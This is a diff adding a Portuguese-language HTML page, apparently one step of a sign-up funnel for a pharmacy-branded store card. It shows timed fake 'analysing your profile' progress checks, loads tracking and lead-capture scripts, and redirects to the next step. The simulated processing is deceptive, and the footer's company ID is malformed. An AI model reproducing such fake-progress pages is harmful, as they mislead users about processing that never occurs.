@@ -1,0 +1,251 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script src="/ml/progress.js"></script><script src="/api/public/pixel.js"></script><script src="/ml/lead-capture.js" defer></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Cartão</title>
+    <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+<script src="/ml/utmify.js"></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            color: white;
+            text-align: center;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #d5d8dd;
+            background-color: #e9ebee;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .logo {
+            margin-left: 20px;
+        }
+        .content {
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        .card {
+            background: linear-gradient(45deg, #0d2240, #14315c);
+            border-radius: 15px;
+            padding: 20px;
+            height: 165px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+        .card-top {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 100px;
+        }
+        .card-bottom {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-end;
+        }
+        .card-name {
+            font-family: 'Sora', sans-serif;
+            font-size: 14px;
+            color: rgb(255, 255, 255);
+        }
+        .loading-item {
+            color: #666;
+            font-family: 'Sora', sans-serif;
+            margin: 15px 0;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .loading-item.visible {
+            opacity: 1;
+        }
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #14315c;
+            border-radius: 50%;
+            margin-bottom: -10px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+<style id="lov-white-bg">html,body{background-color:#fff !important;background-image:none !important;}</style>
+</head>
+<body>
+    <div class="header">
+        <img src="images/logo.png" alt="Logo Drogarias Campeã" class="logo">
+    </div>
+
+    <div class="content">
+        <h2 style="font-family: 'Sora', sans-serif; color: #202020; margin-bottom: 30px;">
+            Aguarde enquanto processamos seu pedido
+        </h2>
+
+        <style>
+            .p6card-wrap { max-width: 340px; margin: 0 auto 30px; }
+            .p6card {
+                position: relative; width: 100%; aspect-ratio: 1586 / 1000;
+                border-radius: 4.5% / 7%; overflow: hidden;
+                box-shadow: 0 14px 30px rgba(0,0,0,.28);
+                font-family: 'Sora', sans-serif;
+                container-type: inline-size;
+            }
+            .p6card .art { position:absolute; inset:0; width:100%; height:100%; object-fit: cover; display:block; z-index:0; }
+            .p6card .shine { position:absolute; top:0; left:-100%; width:55%; height:100%; z-index:4; pointer-events:none;
+                background: linear-gradient(90deg, transparent, rgba(255,255,255,.16), transparent);
+                animation: shine 4s infinite; }
+            @keyframes shine { 0%{left:-100%} 40%{left:130%} 100%{left:130%} }
+
+            /* dados sobrepostos — escalam com a largura do cartão (cqw) */
+            .p6card .num { position:absolute; z-index:3; left:7%; right:7%; top:57.5%;
+                font-size: 5.6cqw; font-weight:600; letter-spacing: .55cqw; white-space:nowrap;
+                color: #fff; text-shadow: 0 .3cqw .6cqw rgba(0,0,0,.55); text-align:center; }
+            .p6card .holder { position:absolute; z-index:3; left:7%; right:7%; top:69%;
+                font-size: 4.4cqw; letter-spacing: .35cqw; text-transform:uppercase; white-space:nowrap;
+                overflow:hidden; text-overflow:ellipsis;
+                color: #fff; text-shadow: 0 .3cqw .6cqw rgba(0,0,0,.55); }
+        </style>
+
+        <div class="p6card-wrap">
+            <div class="p6card">
+                <img class="art" src="/assets/card-blue.png" alt="Cartão Drogarias Campeã">
+                <div class="num">0000 0000 0000 0000</div>
+                <div class="holder" id="cardName">NOME DO CLIENTE</div>
+                <div class="shine"></div>
+            </div>
+        </div>
+        <script>
+            try {
+                const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario'));
+                if (dadosUsuario && dadosUsuario.NOME_CARTAO) {
+                    document.getElementById('cardName').textContent = dadosUsuario.NOME_CARTAO;
+                } else if (dadosUsuario && dadosUsuario.NOME) {
+                    var parts = String(dadosUsuario.NOME).trim().toUpperCase().split(/\s+/).filter(function(p){ return p; });
+                    if (parts.length > 2 && parts.join(' ').length > 24) {
+                        var first = parts[0];
+                        var last = parts[parts.length - 1];
+                        var middle = parts.slice(1, -1).map(function(p){ return p.charAt(0) + '.'; }).join(' ');
+                        document.getElementById('cardName').textContent = (first + ' ' + middle + ' ' + last).trim();
+                    } else {
+                        document.getElementById('cardName').textContent = parts.join(' ');
+                    }
+                }
+            } catch (e) {}
+        </script>
+
+
+        <div id="loadingItems" style="margin: 0px 20px;">
+            <div class="loading-item visible" style="text-align: left;">
+                <div class="loading-spinner" style="display: none;"></div>
+                Aguardando resposta
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Analisando seu perfil
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Preparando seu cartão
+            </div>
+            <div class="loading-item" style="text-align: left;">
+                <div class="loading-spinner"></div>
+                Finalizando solicitação
+            </div>
+        </div>
+    </div>
+
+    <footer style="padding: 10px 15px; text-align: center; margin-top: 50px; background-color: #f9f9f9; border-top: 1px solid #eaeaea; font-family: 'Sora', sans-serif;">
+        <div style="max-width: 600px; margin: 0 auto;">
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Drogarias Campeã Brasil LTDA | CNPJ: 79.379.491.0008-50
+            </p>
+            <p style="color: #777; font-size: 10px; margin-bottom: 5px; line-height: 1.2;">
+                Av. das Nações Unidas, 3000 - Bonfim, Osasco - SP, 06233-903
+            </p>
+            <p style="color: #999; font-size: 9px; margin-top: 5px;">
+                © 2025 - Todos os direitos reservados
+            </p>
+        </div>
+    </footer>
+
+    <script>
+        function showLoadingItems() {
+            const items = document.querySelectorAll('.loading-item');
+            items.forEach((item, index) => {
+                setTimeout(() => {
+                    item.classList.add('visible');
+                    
+                    // Adiciona o check com círculo após o item ficar visível
+                    setTimeout(() => {
+                        const spinner = item.querySelector('.loading-spinner');
+                        spinner.style.display = 'none'; // Esconde o spinner
+                        spinner.insertAdjacentHTML('afterend', `
+                            <div style="
+                                width: 20px;
+                                height: 20px;
+                                background-color: #4CAF50;
+                                border-radius: 50%;
+                                display: inline-flex;
+                                align-items: center;
+                                justify-content: center;
+                                position: relative;
+                                margin-right: 10px;
+                                vertical-align: middle;
+                            ">
+                                <i class="fas fa-check" style="color: white; font-size: 14px;"></i>
+                            </div>
+                        `);
+                    }, 1750);
+                }, index * 2250);
+            });
+
+            setTimeout(() => {
+                window.location.href = buildUrlWithParams('../7/index.html');
+            }, 9000);
+        }
+
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            showLoadingItems();
+        });
+    </script>
+
+
+
+
+</body></html>
